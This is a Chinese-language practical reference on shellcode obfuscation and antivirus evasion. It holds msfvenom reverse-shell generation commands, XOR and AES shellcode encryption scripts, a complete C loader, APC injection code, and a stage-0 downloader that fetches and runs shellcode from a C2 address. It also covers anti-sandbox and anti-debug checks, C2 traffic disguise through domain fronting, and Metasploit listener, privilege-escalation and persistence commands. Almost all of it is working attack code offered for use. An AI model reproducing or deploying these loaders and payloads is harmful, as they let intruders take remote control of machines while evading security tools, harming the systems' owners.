# Shellcode 混淆与免杀实战参考

> 覆盖: MSF生成 → 编码混淆 → 加密 → 分段加载 → C语言加载器 → C2规避

---

## 1. MSFvenom 生成

### 1.1 基础命令

```bash
# === 列出所有 payload ===
msfvenom -l payloads | grep windows

# === 常用生成 ===
# Windows 反弹 Shell (stageless)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o met.exe

# Linux 反弹 Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# macOS
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f macho -o shell.macho

# Raw Shellcode (最常用)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shellcode.bin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c          # C 数组
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python     # Python
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hex        # Hex

# C# (shest! / execute-assembly)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f csharp

# PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-reflection

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o shell.dll
```

### 1.2 关键参数

```bash
# 编码 (浅层混淆)
-e x86/shikata_ga_nai -i 5                    # shikata_ga_nai ×5次迭代

# 排除坏字符
-b '\x00\x0a\x0d\x20'                         # 排除 null/换行/空格

# 注入方式
# ExitThread / ExitProcess → 进程退出方式
EXITFUNC=thread                                # 推荐: thread (静默退出)
EXITFUNC=process                               # 默认
EXITFUNC=seh                                   # SEH 链
EXITFUNC=none                                  # 不退出

# 完整命令
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -b '\x00\x0a\x0d' \
  EXITFUNC=thread \
  -f c
```

---

## 2. 编码与混淆

### 2.1 XOR 加密

```python
# 简单的 XOR 加密 Shellcode
import sys

def xor_encode(shellcode, key=0xAA):
    return bytes([b ^ key for b in shellcode])

with open('shellcode.bin', 'rb') as f:
    sc = f.read()

encoded = xor_encode(sc)
# 输出 C 数组
print('unsigned char shellcode[] = {')
print(', '.join(f'0x{b:02x}' for b in encoded))
print('};')
print(f'// length: {len(encoded)}')
```

### 2.2 AES 加密 Shellcode

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

key = os.urandom(16)
iv = os.urandom(16)

with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(shellcode, AES.block_size))

print(f'unsigned char key[] = {{ {",".join(f"0x{b:02x}" for b in key)} }};')
print(f'unsigned char iv[] = {{ {",".join(f"0x{b:02x}" for b in iv)} }};')
print(f'unsigned char shellcode[] = {{ {",".join(f"0x{b:02x}" for b in encrypted)} }};')
```

### 2.3 IPv4/IPv6 混淆

```bash
# 将 Shellcode 编码成 IPv4 地址数组
# 每个 IP 地址 = 4字节 shellcode
# 配合 Socket 恢复

# 类似思路: UUID 混淆
# Shellcode → UUID 字符串 → 运行时解码
```

---

## 3. 加载器 (C语言)

### 3.1 基础 VirtualAlloc 加载器

```c
// msvc: cl.exe /MT /O1 loader.c /Fe:loader.exe
// mingw: x86_64-w64-mingw32-gcc loader.c -o loader.exe

#include <windows.h>
#include <stdio.h>

// XOR 解码
void xor_decode(unsigned char* buf, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

int main() {
    // 加密后的 shellcode
    unsigned char shellcode[] = { /* ... */ };
    int sc_len = sizeof(shellcode);
    
    // 1. 解码 (XOR)
    xor_decode(shellcode, sc_len, 0xAA);
    
    // 2. 分配内存
    LPVOID exec_mem = VirtualAlloc(0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) return 1;
    
    // 3. 拷贝 shellcode
    RtlMoveMemory(exec_mem, shellcode, sc_len);
    
    // 4. 修改内存权限
    DWORD oldProtect;
    VirtualProtect(exec_mem, sc_len, PAGE_EXECUTE_READ, &oldProtect);
    
    // 5. 执行
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    
    // 6. 等待 (保持连接)
    Sleep(INFINITE);
    
    return 0;
}
```

### 3.2 规避技术 — Syscall 直接调用

```c
// 不通过 ntdll.dll → 直接 syscall → 绕过用户态 hook
// 技术: Hell's Gate / Halo's Gate / SysWhispers3

// SysWhispers3 生成 syscall 桩代码
// 优势: EDR/AV 在 ntdll.dll hook → syscall 绕过
```

### 3.3 规避技术 — APC 注入

```c
// 创建暂停进程 → 分配内存 → 写shellcode → QueueUserAPC → ResumeThread
// 比 CreateThread 更隐蔽

STARTUPINFO si = {0};
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);

LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sc_len, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(pi.hProcess, mem, shellcode, sc_len, NULL);

DWORD old;
VirtualProtectEx(pi.hProcess, mem, sc_len, PAGE_EXECUTE_READ, &old);

QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);
ResumeThread(pi.hThread);
```

### 3.4 规避技术 — 回调执行

```c
// 利用 Windows 回调函数执行 shellcode
// 不走 CreateThread → 更隐蔽

// EnumFonts / EnumWindows / CertEnumSystemStore / ...
EnumFontsW(hdc, NULL, (FONTENUMPROCW)shellcode_addr, 0);
```

---

## 4. 分段加载 (Staged Shellcode)

### 4.1 分段原理

```
Stage 0 (小下载器, ~200字节)
  → 连接 C2 → 下载 Stage 1 (大payload, ~5KB)
  → 内存执行 Stage 1
  → Stage 1 可能再下载 Stage 2 (Meterpreter DLL等)

优势: Stage 0 极简 → 容易免杀; 真正的恶意逻辑在 Stage 1/2 → 可以随时换
```

### 4.2 简易下载器

```c
// Stage 0: 下载 + 执行
// 体积 ~1KB, 功能单一, 易免杀

#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

int main() {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrlA(hSession, "http://your-c2/shellcode.bin", NULL, 0, 0, 0);
    
    unsigned char buf[65536];
    DWORD bytesRead;
    InternetReadFile(hConnect, buf, sizeof(buf), &bytesRead);
    
    LPVOID exec = VirtualAlloc(0, bytesRead, MEM_COMMIT, PAGE_READWRITE);
    RtlMoveMemory(exec, buf, bytesRead);
    
    DWORD old;
    VirtualProtect(exec, bytesRead, PAGE_EXECUTE_READ, &old);
    
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    Sleep(INFINITE);
    return 0;
}
```

---

## 5. Donut — .NET/PE 转 Shellcode

```bash
# Donut: 将 .NET Assembly / PE / VBS / JScript 转为 position-independent shellcode

# .NET Assembly → Shellcode
donut -i SharpHound.exe -o sharp.bin -a 2        # x64
donut -i Rubeus.exe -o rubeus.bin -a 2

# 仅 Shellcode (no shellcode runner)
donut -i tool.exe -f 1 -o tool.bin               # 原始 shellcode
donut -i tool.exe -f 2 -o tool.bin               # base64
donut -i tool.exe -f 3 -o tool.bin               # C 数组
donut -i tool.exe -f 7 -o tool.bin               # Python

# → 生成的 .bin 可以直接被加载器执行
# → 配合上面 VirtualAlloc 加载器
```

---

## 6. 规避检测技术汇总

### 6.1 静态规避

```
- XOR/AES/RC4 加密 Shellcode
- 分片存储 (拼接后再执行)
- 字符串混淆 (所有C2/URL不能明文)
- 移除导入表 (动态解析 API)
- API hashing (不导入, 自己算hash找函数)
- 资源文件内嵌 Shellcode
```

### 6.2 动态规避

```
- 延时执行 (Sleep 绕过沙箱)
- 环境检测 (检查 进程数/内存/是否虚拟机)
- 反调试 (IsDebuggerPresent/NtGlobalFlag)
- API Unhooking (重新加载干净的 ntdll.dll)
- 直接 Syscall (绕过 ntdll hook)
- 回调执行 (不调 CreateThread)
- 回调注入 (EnumWindow/QueueUserAPC)
```

### 6.3 环境检测代码

```c
// 反沙箱/反虚拟机检查

// 1. 延时 (沙箱通常只运行几秒)
Sleep(30000);  // 30秒 → 沙箱超时

// 2. 检查物理内存
MEMORYSTATUSEX mem = { sizeof(mem) };
GlobalMemoryStatusEx(&mem);
if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) exit(0);  // <2GB → 可能是沙箱

// 3. 检查 CPU 核心数
SYSTEM_INFO si;
GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 2) exit(0);

// 4. 检查是否被调试
if (IsDebuggerPresent()) exit(0);

// 5. 检查常见沙箱/分析工具进程
// procexp.exe, procmon.exe, wireshark.exe, ollydbg.exe, x64dbg.exe, ...
```

---

## 7. C2 流量伪装

### 7.1 域前置 (Domain Fronting)

```
# 利用 CDN (Cloudflare/Azure) + 高信誉域名
# 实际请求: your-c2.azureedge.net
# SNI/TLS: www.microsoft.com (高信誉)
# Host头: www.microsoft.com

# 工具: Cobalt Strike Malleable C2 Profile
# Ailcyron/Mythic → profile 配置
```

### 7.2 流量模仿

```
# C2 流量伪装成:
- 正常的 REST API (模仿 Office365 API 心跳)
- WebSocket (模仿 消息推送)
- DNS 查询 (DNS Beacon)
- 图片上传 (POST + JPEG头 + 隐写数据)
- 社交媒体 API (Twitter/Telegram 心跳格式)
```

---

## 8. MSF 监听与迁移

```bash
# === 启动监听 ===
msfconsole -q
use multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false   # 不要退出
run

# Shell 到手后:
# 迁移进程
ps                        # 列进程
migrate <PID>             # 迁移到稳定的系统进程 (svchost/explorer)

# 提权 (尝试)
getsystem

# 持久化
run persistence -U -i 60 -p 4444 -r <attacker_ip>
```

---

*参考: MSFvenom + Donut + OSEP + 实战经验*
